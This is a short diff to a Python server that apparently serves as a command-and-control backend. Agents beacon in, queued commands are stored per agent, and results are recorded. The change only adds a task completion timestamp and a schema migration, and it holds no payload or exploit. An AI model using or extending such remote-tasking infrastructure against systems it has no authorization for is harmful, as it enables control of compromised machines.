@@ -190,14 +190,19 @@ def _init_db():
                 sysinfo    TEXT
             );
             CREATE TABLE IF NOT EXISTS tasks (
-                id         TEXT PRIMARY KEY,
-                agent_id   TEXT NOT NULL,
-                command    TEXT NOT NULL,
-                status     TEXT NOT NULL DEFAULT 'pending',
-                created_at INTEGER NOT NULL,
-                output     TEXT
+                id           TEXT PRIMARY KEY,
+                agent_id     TEXT NOT NULL,
+                command      TEXT NOT NULL,
+                status       TEXT NOT NULL DEFAULT 'pending',
+                created_at   INTEGER NOT NULL,
+                output       TEXT,
+                completed_at INTEGER
             );
         """)
+        try:
+            con.execute("ALTER TABLE tasks ADD COLUMN completed_at INTEGER")
+        except Exception:
+            pass
 
 
 def _handle_beacon(msg):
@@ -225,8 +230,8 @@ def _handle_beacon(msg):
         output  = result.get("o") or result.get("output", "")
         with _db() as con:
             con.execute(
-                "UPDATE tasks SET status='done', output=? WHERE id=?",
-                (output, task_id)
+                "UPDATE tasks SET status='done', output=?, completed_at=? WHERE id=?",
+                (output, int(time.time()), task_id)
             )
 
     if DEBUG:
@@ -320,7 +325,7 @@ async def create_task(request: Request):
     task_id = str(uuid.uuid4())
     with _db() as con:
         con.execute(
-            "INSERT INTO tasks VALUES (?,?,?,'pending',?,NULL)",
+            "INSERT INTO tasks VALUES (?,?,?,'pending',?,NULL,NULL)",
             (task_id, agent_id, command, int(time.time()))
         )
     return {"task_id": task_id}
